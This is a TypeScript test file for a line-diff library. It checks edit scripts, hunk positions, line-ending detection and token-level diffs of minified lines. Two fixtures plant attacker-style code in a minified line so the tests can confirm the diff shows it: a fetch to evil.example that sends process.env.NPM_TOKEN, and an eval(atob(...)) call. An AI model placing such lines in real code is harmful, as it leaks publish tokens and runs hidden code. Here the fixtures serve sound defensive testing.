import { describe, expect, test } from "bun:test";
import { diffSeq, renderLineDiff } from "../src/linediff.ts";

const changed = (out: string) => out.split("\n").filter((l) => l.startsWith("-") || l.startsWith("+"));

describe("diffSeq", () => {
  test("ordered edit script that rebuilds both sides", () => {
    const a = ["a", "b", "c", "a", "b", "b", "a"];
    const b = ["c", "b", "a", "b", "a", "c"];
    const ops = diffSeq(a, b)!;
    expect(ops.filter((o) => o.op !== "+").map((o) => o.v)).toEqual(a);
    expect(ops.filter((o) => o.op !== "-").map((o) => o.v)).toEqual(b);
    expect(ops.filter((o) => o.op !== "=").length).toBe(5); // Myers' minimal D for this pair
  });

  test("gives up past the edit cap", () => {
    expect(diffSeq(["a", "b", "c"], ["x", "y", "z"], 2)).toBeUndefined();
  });
});

describe("renderLineDiff", () => {
  test("a line kept in both versions is not reported even when a copy of it moved", () => {
    const out = renderLineDiff("f()\n}\nreturn 1\n}", "f()\n}\nreturn 2\n}");
    expect(changed(out)).toEqual(["-return 1", "+return 2"]);
  });

  test("line-ending-only changes are named, not rendered as a rewrite", () => {
    const out = renderLineDiff("a\r\nb\r\n}", "a\nb\n}");
    expect(out).toContain("line endings or whitespace only");
    expect(changed(out)).toEqual([]);
  });

  test("removed and added lines stay in file order with hunk positions", () => {
    const out = renderLineDiff("one\ntwo\nthree\nfour", "one\n2\nthree\n4");
    expect(out).toContain("@@ -2 +2 @@");
    expect(changed(out)).toEqual(["-two", "+2", "-four", "+4"]);
    expect(out.indexOf("-two")).toBeLessThan(out.indexOf("-four"));
  });

  test("a changed minified line shows the changed tokens with context, not both whole lines", () => {
    const base = Array.from({ length: 400 }, (_, i) => `var v${i}=f(${i});`).join("");
    const old = base;
    const next = base.replace("var v200=f(200);", "var v200=f(200);fetch('https://evil.example/x?k='+process.env.NPM_TOKEN);");
    const out = renderLineDiff(old, next);
    expect(out).toContain("{+");
    expect(out).toContain("evil.example");
    expect(out).toContain("NPM_TOKEN");
    expect(out.length).toBeLessThan(next.length / 4);
  });

  test("every changed token of a minified line is rendered", () => {
    const base = Array.from({ length: 300 }, (_, i) => `a${i}();`).join("");
    const next = base.replace("a10();", "b10();").replace("a250();", "eval(atob('Zm9v'));");
    const out = renderLineDiff(base, next);
    for (const s of ["b10", "a10", "eval", "atob", "Zm9v", "a250"]) expect(out).toContain(s);
  });

  test("past the edit cap, every line new to this version is still listed", () => {
    const old = Array.from({ length: 9000 }, (_, i) => `o${i}`).join("\n");
    const next = Array.from({ length: 9000 }, (_, i) => (i % 2 ? `o${i}` : `n${i}`)).join("\n");
    const out = renderLineDiff(old, next);
    expect(out).toContain("too many changes");
    expect(changed(out).filter((l) => l.startsWith("+")).length).toBe(4500);
  });

  test("a file added from nothing is all + lines", () => {
    expect(changed(renderLineDiff(undefined, "x\nx\nx"))).toEqual(["+x", "+x", "+x"]);
  });
});
